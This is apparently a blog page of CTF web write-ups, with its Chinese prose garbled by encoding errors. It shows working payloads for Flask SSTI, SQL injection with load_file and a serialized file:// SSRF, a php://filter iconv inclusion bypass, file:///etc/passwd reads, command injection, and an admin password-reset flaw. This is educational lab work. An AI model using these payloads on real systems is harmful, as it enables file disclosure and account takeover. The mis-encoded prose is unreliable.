<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://img-blog.csdnimg.cn/183c9b29277e4ee497d4f342aad251b0.png" alt="4"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$miwen</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_o</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// echo $_o;</span>
        
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>   
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">return</span> <span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag
*/</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œè®°å½•ä¸€ä¸‹ã€‚<br>æˆ‘ä»¬åªéœ€è¦é€†å‘è§£å¯†å³å¯ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_o</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_o</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>   
    <span class="token punctuation">&#125;</span> 
<span class="token keyword">echo</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾—åˆ°flagã€‚</p>
<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p><img src="https://img-blog.csdnimg.cn/523623501a0d4d65b734a05f6fae1ba2.png" alt="2"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token operator">//</span>æ³¨å†Œäº†ä¸€ä¸ªFLAGçš„configï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤çš„è¯å°±ç›´æ¥<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>sstiæ¨¡æ¿æ³¨å…¥ï¼Œæ˜¯pythonFlaskæ¡†æ¶ã€‚çœ‹åˆ°<br><code>@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)</code>è®¿é—®è·¯å¾„<code>http://61.147.171.105:64429/shrine/%7B%7B8*8%7D%7D</code>å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚<br><code>safe_jinja</code>å‡½æ•°å¯¹**(ï¼Œ)ï¼Œconfigï¼Œself**è¿›è¡Œè¿‡æ»¤ã€‚<br><img src="https://img-blog.csdnimg.cn/45c0d3fbef914c998da7b8cc9faac0f5.png" alt="1">æŸ¥çœ‹ä¸€ä¸‹appä¸‹çš„configã€‚</p>
<p>æ–‡ç« ä¸­äº†è§£åˆ°ï¼š<br><strong>get_flashed_messageså‡½æ•°</strong>ï¼š<code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code><br><strong>url_forå‡½æ•°</strong>ï¼š<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4609f4f593f249f3b6aabc5fa7cc213c.png" alt="2"><br>å¾—åˆ°flagã€‚</p>
<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>éå¸¸å…·æœ‰å­¦ä¹ ä»·å€¼</p>
<p><img src="https://img-blog.csdnimg.cn/b9a7ec91e3214f8bb606a267bb14632b.png" alt="1"><br>æ³¨å†Œä¸€ä¸ªè´¦å·ç™»é™†ã€‚<br><img src="https://img-blog.csdnimg.cn/f02e85228c7740f685c0fc3952ff3d11.png" alt="2"><br><code>?no=1 and 1=1</code>æ­£å¸¸å›æ˜¾ï¼Œ<code>?no=1 and 1=2</code>æŠ¥é”™ã€‚å­˜åœ¨SQLæ³¨å…¥ã€‚<br><code>?no=1 order by 5</code>æŠ¥é”™<br><img src="https://img-blog.csdnimg.cn/2b8f182925864af49d2e3b146c651a8c.png" alt="3"><br>å¼€å§‹çˆ†ç ´ã€‚<br>å‘ç°åŠ è½½<code>?no=1 union select 1,2,3,4</code>å‡ºç°<br><img src="https://img-blog.csdnimg.cn/1d4d6d53e1444e8c80cc361073c38eda.png" alt="1"><br>è‚¯å®šæœ‰ä¸œè¥¿è¢«è¿‡æ»¤äº†ã€‚æµ‹è¯•å‘ç°è¾“å…¥<code>-1/**/union/**/select/**/1,2,3,4</code>æ­£å¸¸ã€‚<code>++å¯ä»¥ä»£æ›¿/**/</code><br><img src="https://img-blog.csdnimg.cn/d6f1a1faeadb4b2ba8d126ca9b202e75.png" alt="4"><br>å­˜åœ¨ååºåˆ—åŒ–ï¼Œå‘ç°2å¤„å¯ä»¥å›æ˜¾ã€‚ç»§ç»­æµ‹è¯•<br><code>?no=-1/**/union/**/select/**/1,table_name,3,4 from INFORMATION_SCHEMA.TABLES -- -</code><br><code>?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4 from INFORMATION_SCHEMA.columns where table_name=&quot;users&quot; -- -</code><br><img src="https://img-blog.csdnimg.cn/757a55887b714a0d9f8e953453f4c150.png" alt="2"><br>å­˜åœ¨ååºåˆ—åŒ–ã€‚</p>
<blockquote>
<p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:3:â€rggâ€;s:3:â€ageâ€;i:48;s:4:â€blogâ€;s:7:â€123.comâ€;}</p>
</blockquote>
<p>åé¢çœŸæ˜¯ä¸ä¼šäº†ã€‚äº†è§£ä¸€ä¸‹å¸ˆå‚…ä»¬çš„æ–‡ç« ã€‚<br><strong>æ³•ä¸€</strong><br>é‡‡ç”¨æ„é€ fileåè®®å»è¯»å–&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpçš„å†…å®¹ï¼ˆfileåè®®ä¸»è¦ç”¨äºè®¿é—®è®¡ç®—æœºæœ¬åœ°æ–‡ä»¶ï¼ŒåŸºæœ¬æ ¼å¼ä¸ºï¼šfile:&#x2F;&#x2F;&#x2F;æ–‡ä»¶è·¯å¾„</p>
<blockquote>
<p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,2 ,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:1:â€1â€;s:3:â€ageâ€;i:18;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}â€™#</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/b4cdabced702488fad045fa3a4349ad6.png" alt="2"></p>
<p><strong>æ³•äºŒ</strong><br> åœ¨MySQLä¸­ï¼ŒLOAD_FILE()å‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</p>
<blockquote>
<p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,load_file(â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€™) ,3,4#</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/1dbe5ddda5414ef98dbf713cc9269ad9.png" alt="3"></p>
<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p><img src="https://img-blog.csdnimg.cn/ed1db60906fd457e9bfd3bc7dbf9f8e8.png" alt="1"><br>ä¸€é“éå¸¸æ— å˜å¤´çš„é¢˜<br>ä¸€æ‰“å¼€é¶åœºä»¥ä¸ºåŸæ¥åšè¿‡ç±»ä¼¼çš„é¢˜ã€‚å°±ç›´æ¥<strong>127.0.0.1|ls</strong>ï¼Œçœ‹æ¥æ˜¯å¤§æ„äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/98ece7b60e704191a326c30e875fef28.png" alt="2"><br>çˆ†ç ´ä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ<br><img src="https://img-blog.csdnimg.cn/ee2d13cafd3e41e0b42b1104dde8b11c.png" alt="2"></p>
<p><img src="https://img-blog.csdnimg.cn/051cc20d945a4c9c8eba5da238368110.png" alt="3">453çš„æ²¡æœ‰è¿‡æ»¤ã€‚<br><img src="https://img-blog.csdnimg.cn/0b317f3b22524f75a9c568a3801c5d6d.png" alt="5"></p>
<p>å¯¹@è¿›è¡Œurlç¼–ç %40ï¼Œè¿˜æ˜¯æ²¡ç”¨ã€‚<br>è¯•è¯•å®½å­—ç¬¦%EF<br>å¾—åˆ°å†…å®¹ã€‚ä¿å­˜ä¸ºhtmlæ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/6e906ca935e44e08985578b99ca60031.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/6ef3195b6ae148e09b3132416f430317.png" alt="5"><br>æŸ¥èµ„æ–™ååŸæ¥æ˜¯djangoæŠ¥é”™ï¼Œä»”ç»†çœ‹æ–‡æ¡£å‘ç°ç»å¯¹è·¯å¾„ï¼Œæ‰¾ä¸€ä¸‹å‘ç°æ•°æ®åº“ç»å¯¹è·¯å¾„</p>
<blockquote>
<p>&#x2F;opt&#x2F;api&#x2F;database.sqlite3 phpçš„curl+@ç»å¯¹è·¯å¾„æ–‡ä»¶å</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2c33bda622c940e0bc0f67609368b994.png" alt="5"><br>å®½å­—èŠ‚+&#x2F;opt&#x2F;api&#x2F;database.sqlite3æŠ¥é”™å‡ºå†…å®¹ï¼ŒæŸ¥æ‰¾å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/546cdd2af98047b481d0122cc007eb32.png" alt="5"></p>
<h2 id="æ³°å±±æ¯-ç®€å•çš„æ–‡ä»¶åŒ…å«"><a href="#æ³°å±±æ¯-ç®€å•çš„æ–‡ä»¶åŒ…å«" class="headerlink" title="æ³°å±±æ¯-ç®€å•çš„æ–‡ä»¶åŒ…å«"></a>æ³°å±±æ¯-ç®€å•çš„æ–‡ä»¶åŒ…å«</h2><p><img src="https://img-blog.csdnimg.cn/b1427ceb81ee46f5bff6a37e6500cc57.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é¢˜ç›®ä¸­åŒ…å«äº†check.phpæ–‡ä»¶ï¼Œå¯èƒ½æ˜¯è¿‡æ»¤äº†ä¸€äº›å‡½æ•°ï¼Œæ³¨æ„ä¸€ä¸‹ã€‚æ•´ä½“çœ‹èµ·æ¥å¾ˆç®€å•ï¼Œè¯»å»ä¸€ä¸ªæ–‡ä»¶çœ‹çœ‹<br>payload:<strong><a href="http://61.147.171.105:49222/?filename=check.php">http://61.147.171.105:49222/?filename=check.php</a></strong><br><img src="https://img-blog.csdnimg.cn/2fa8d03887be43f8ac061799752d2b73.png" alt="2">æ­£ç¡®çš„ç”¨æ³•ï¼Œé”™è¯¯çš„æ–¹æ³•ï¼Ÿé‡‡ç”¨ä¼ªåè®®è¯•è¯•æ–‡ä»¶åŒ…å«ï¼Œç»è¿‡å‡ æ¬¡æµ‹è¯•å‘ç°åªæœ‰ä½¿ç”¨php:&#x2F;&#x2F;filterè¯»å–æ–‡ä»¶æ—¶æ‰ä¼šæ˜¾ç¤º<strong>do not hackï¼</strong>ï¼Œå…¶ä»–çš„å›æ˜¾å‡ä¸ºä¸Šå›¾ã€‚é‚£ä¹ˆå°±ä»php:&#x2F;&#x2F;filterä¸‹æ‰‹ã€‚é€šè¿‡æµ‹è¯•äº†å‡ ä¸ªè¿‡æ»¤å™¨å‘ç°ï¼Œèƒ½ç”¨çš„è¿‡æ»¤å™¨åªæœ‰è¿™ä¸ªâ€”â€”**convert.iconv.***ã€‚æ¨èä¸€ç¯‡æ–‡ç« <a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filterçš„å„ç§è¿‡æ»¤å™¨</a></p>
<blockquote>
<p>convert.iconv.<em>çš„ç¼–ç æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼š<br>UCS-4</em><br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*<br>ä½¿ç”¨æ–¹æ³•ï¼šconvert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</p>
</blockquote>
<p>éšä¾¿é€‰ä¸¤ä¸ªè¯•è¯•ï¼š<br><img src="https://img-blog.csdnimg.cn/e139f5936a634f27851a021afc968e3f.png" alt="1">ä½¿ç”¨burpå¿«ä¸€ç‚¹<br><img src="https://img-blog.csdnimg.cn/8a26b67d40c54abf9b4f646cc65fb213.png" alt="2"><img src="https://img-blog.csdnimg.cn/7f4499930bc548d78033057c9a92cf05.png" alt="3">æ‹¿åˆ°flagã€‚</p>
<h2 id="ä¿¡é€šé™¢-SSRF-Me"><a href="#ä¿¡é€šé™¢-SSRF-Me" class="headerlink" title="ä¿¡é€šé™¢ SSRF-Me"></a>ä¿¡é€šé™¢ SSRF-Me</h2><p>çœ‹æ¥è€ƒç‚¹æ˜¯ssrfã€‚<br><img src="https://img-blog.csdnimg.cn/6e134931c77f4b4a8b51c32ed069735d.png" alt="1"><br>æŸ¥çœ‹æºç ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/0691770356f3440db6bfa7c51ab9e2b6.png" alt="2"><br>ç”±æ­¤å¯ä»¥è¯´æ˜è¯·æ±‚åœ°å€ä¸º1270.0.1<br><code>Captcha: substr(md5(captcha), -6, 6) == &quot;b15ed1&quot;</code><br>æ„æ€æ˜¯å–MD5åŠ å¯†åçš„å­—ç¬¦ä»åå…­ä½å¼€å§‹æ•°å…­ä½ä¸”å­—ç¬¦æ˜¯b15ed1ï¼Œé‚£ä¹ˆåˆ°è¿™é‡Œå°±è¦å¼€å§‹çˆ†ç ´åŸå§‹æ•°æ®äº†</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$captcha</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$captcha</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"b15ed1"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$captcha</span><span class="token punctuation">;</span>
<span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token variable">$captcha</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

//è¾“å‡ºç»“æœï¼š23129<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å½“è¾“å…¥æ¡†å†…è¾“å…¥<strong>127.0.0.1:80</strong>æ—¶ï¼Œä¼šè¿”å›ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œé‚£ä¹ˆåˆ©ç”¨ssrfçš„æ¼æ´ï¼Œä½¿ç”¨ä¼ªåè®®<br>è¾“å…¥<strong>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</strong>æ—¶æˆåŠŸè¿”å›<br><img src="https://img-blog.csdnimg.cn/c582bb91a3e7459a897e3524327530fa.png" alt="3">è¯»å–flag <strong>file:&#x2F;&#x2F;&#x2F;flag</strong>ï¼Œflagå…³é”®å­—ç¬¦è¿‡æ»¤äº†ã€‚urlç¼–ç ç»•è¿‡ï¼Œæµè§ˆå™¨ä¸Šå¯¹flagç¼–ç ä¸€æ¬¡ï¼Œä½†æ˜¯burpä¸Šéœ€è¦å¯¹flagç¼–ç ä¸¤æ¬¡å“¦ã€‚</p>
<blockquote>
<p>file:&#x2F;&#x2F;&#x2F;%66%6c%61%67<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567</p>
</blockquote>
<h2 id="bugï¼ˆRCTF2021ï¼‰"><a href="#bugï¼ˆRCTF2021ï¼‰" class="headerlink" title="bugï¼ˆRCTF2021ï¼‰"></a>bugï¼ˆRCTF2021ï¼‰</h2><p>å…¨ç¨‹BURPæŒ‚ä»£ç†ï¼Œèƒ½å¤Ÿä»æ¯ä¸€ä¸ªåŒ…ä¸­è·å¾—æœ‰æ•ˆä¿¡æ¯ï¼Œè¿˜æ˜¯è¦ä»”ç»†è§‚å¯Ÿï¼ï¼ï¼<br>æ‰“å¼€å°±æ˜¯ç™»å½•æ¡†ï¼š<br><img src="https://img-blog.csdnimg.cn/3efee6e2436046548b1c91b628940271.png" alt="1"><br>å°è¯•adminç™»å½•ï¼Œå¼±å¯†ç æ— æœã€‚å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œæ³¨å†Œadminæ˜¾ç¤ºç”¨æˆ·åå·²å­˜åœ¨ï¼Œæ¢testã€‚<br>ç™»é™†æˆåŠŸåå°è¯•æ¯ä¸€ä¸ªåŠŸèƒ½ç‚¹ï¼š<br>ä½¿ç”¨manageæ—¶<br><img src="https://img-blog.csdnimg.cn/bc84396bd69046409299c59b0d5b7305.png" alt="123"><br>personalåŠŸèƒ½ç‚¹ï¼š<br>è¿™é‡Œæ¯”è¾ƒå¯ä»¥çš„åœ°æ–¹æ˜¯cookieçš„userï¼Œåº”è¯¥æ˜¯MD5åŠ å¯†ï¼Œè§£å¯†éœ€è¦ä»˜è´¹ï¼Œæš‚æ—¶ä¸è€ƒè™‘ã€‚è¿˜æœ‰å°±æ˜¯<strong>uid</strong>å€¼ã€‚<br>ç›´æ¥æ”¹ä¸º1æ˜¯ä¸å…è®¸çš„ï¼Œæ‰¾å…¶ä»–æ€è·¯ã€‚çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°ä¸éœ€è¦å¸¦cookie-userçš„åŒ…<br><img src="https://img-blog.csdnimg.cn/13e8f73a143545dbbf0c9b6ab04bb330.png" alt="2"></p>
<p>ç™»å‡ºä¹‹åçœ‹æ‰¾å›å¯†ç åŠŸèƒ½ç‚¹ã€‚<br>ç”±äºæˆ‘çŸ¥é“testç”¨æˆ·çš„ä¿¡æ¯ï¼Œç›´æ¥è¾“å…¥<br><img src="https://img-blog.csdnimg.cn/44ed7431b53547d8aac7f20e35791019.png" alt="123"><br>è¿™ä¸ªåŒ…çš„è¯¦æƒ…å¦‚ä¸‹ï¼šä»–æ²¡æœ‰è¿›è¡ŒuseréªŒè¯åé¢æœ‰å¸Œæœ›ã€‚<br><img src="https://img-blog.csdnimg.cn/a57eb39e769e437db01e532a5e5fd17d.png" alt="5"><br>ä¸‹é¢è¿™ä¸ªæ˜¯è¾“å…¥æ–°å¯†ç çš„åŒ…ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/5f729b4838de4ca384d994ffd06da6a4.png" alt="4"><br>åœ¨è¿™é‡Œå°è¯•æŠŠusernameæ”¹ä¸ºadminï¼ŒæˆåŠŸä¿®æ”¹adminå¯†ç <br><img src="https://img-blog.csdnimg.cn/5c48c75714ab4dbbab310d677fe9ee7b.png" alt="5"><br>éšåæˆåŠŸç™»å½•adminè´¦å·ã€‚<br><img src="https://img-blog.csdnimg.cn/699097f08553466ca469704221d959ca.png" alt="1"><br>ä½¿ç”¨manageåŠŸèƒ½ç‚¹å‘ç°IPä¸è¢«å…è®¸ã€‚<br>ç›´æ¥X-Forwarded-For: 127.0.0.1ï¼Œå‡ºç°ç•Œé¢<br><img src="https://img-blog.csdnimg.cn/8826e8d89a444c78ae6bf348ebc53225.png" alt="2"></p>
<p>æŸ¥çœ‹æºä»£ç å‘ç°å¯ç–‘<br><img src="https://img-blog.csdnimg.cn/8af6010afbe345ffbf0c271092bfab0c.png" alt="1"></p>
